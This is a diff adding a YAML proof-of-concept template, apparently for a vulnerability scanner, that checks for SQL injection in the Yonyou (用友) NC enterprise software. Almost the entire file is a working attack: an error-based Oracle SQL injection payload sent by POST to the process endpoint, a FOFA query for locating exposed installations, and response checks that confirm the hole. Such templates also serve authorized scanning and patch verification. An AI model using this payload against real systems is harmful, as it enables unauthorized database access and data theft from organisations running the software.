@@ -1,0 +1,21 @@
+id: poc-yaml-yongyou-nc-process-sqli
+info:
+  name: 用友NC process SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  payload: urlencode("' AND 7194=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(98)||CHR(98)||CHR(113)||(SELECT
+    (CASE WHEN (7194=7194) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(120)||CHR(113)||CHR(113)||CHR(62)))
+    FROM DUAL)-- dJyN")
+requests:
+- method: POST
+  path: /portal/pt/task/process?pageId=login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: id=1&oracle=1&pluginid=1{{.payload}}
+  expression: status_code == 200 && contains(body,"qqbbq1qxxqq") && contains(body,"SYS.XMLTYPE")
+    && contains(body,"nc.bs.dao.DAOException")
+transport: http
